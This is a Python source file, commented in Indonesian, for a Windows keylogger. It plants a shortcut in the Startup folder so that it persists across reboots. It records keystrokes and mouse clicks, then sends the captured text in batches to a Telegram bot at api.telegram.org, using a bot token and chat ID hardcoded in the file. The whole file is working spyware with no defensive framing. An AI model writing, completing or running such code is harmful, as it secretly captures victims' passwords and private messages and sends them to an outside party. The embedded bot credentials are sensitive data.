import os
import sys
import requests
from pynput import keyboard, mouse
import threading

def add_to_startup():
    try:
        import pythoncom
        from win32com.shell import shell, shellcon
    except ImportError:
        print("Module pywin32 belum terinstall. Install dengan 'pip install pywin32'")
        return

    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    exe_path = sys.executable  # path ke .exe jika sudah di-compile dengan PyInstaller

    shortcut_path = os.path.join(startup_folder, "MyKeylogger.lnk")

    if not os.path.exists(shortcut_path):
        shell_link = pythoncom.CoCreateInstance(
            shell.CLSID_ShellLink, None,
            pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)

        shell_link.SetPath(exe_path)
        shell_link.SetWorkingDirectory(os.path.dirname(exe_path))
        shell_link.SetDescription("Shortcut untuk MyKeylogger")

        persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
        persist_file.Save(shortcut_path, 0)
        print("Shortcut startup berhasil dibuat.")

class Send:
    @staticmethod
    def send_text_via_bot(bot_token, chat_id, text):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {'chat_id': chat_id, 'text': text}
        try:
            response = requests.post(url, data=data)
            if response.status_code != 200:
                print("Failed to send text. Status code:", response.status_code)
        except Exception as e:
            print(f"An error occurred: {e}")

    @staticmethod
    def send_text_async(bot_token, chat_id, text):
        thread = threading.Thread(target=Send.send_text_via_bot, args=(bot_token, chat_id, text))
        thread.daemon = True
        thread.start()

class Keylogger:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log = ""

    def write_to_log(self, key):
        try:
            letter = str(key).replace("'", "")
        except:
            letter = ""

        ignore_keys = [
            'Key.tab', 'Key.shift_r', 'Key.ctrl_l', 'Key.alt_l', 'Key.up', 'Key.down', 'Key.backspace',
            'Key.right', 'Key.left', 'Key.shift', 'Key.alt', 'Key.alt_gr', 'Key.alt_l', 'Key.alt_r',
            'Key.caps_lock', 'Key.cmd', 'Key.cmd_l', 'Key.cmd_r', 'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.delete'
        ]

        if letter == 'Key.enter':
            self.log += '\n\n'  # dua enter
            Send.send_text_async(self.bot_token, self.chat_id, self.log)
            self.log = ""
        elif letter == 'Key.space':
            self.log += ' '
        elif letter not in ignore_keys:
            self.log += letter

        if len(self.log) > 30:
            Send.send_text_async(self.bot_token, self.chat_id, self.log)
            self.log = ""

    def on_click(self, x, y, button, pressed):
        if pressed and button == mouse.Button.left:
            if self.log:
                Send.send_text_async(self.bot_token, self.chat_id, self.log)
                self.log = ""

    def run(self):
        with keyboard.Listener(on_press=self.write_to_log) as kl, \
             mouse.Listener(on_click=self.on_click) as ml:
            kl.join()
            ml.join()

if __name__ == "__main__":
    add_to_startup()  # Tambahkan ini agar shortcut startup dibuat saat program dijalankan pertama kali
    bot_token = '7905976115:AAElnrFwyT8Zw-Le20C2XJ5dQ5sgV0Yy_iQ'
    chat_id = '1338743822'
    keylogger = Keylogger(bot_token, chat_id)
    keylogger.run()
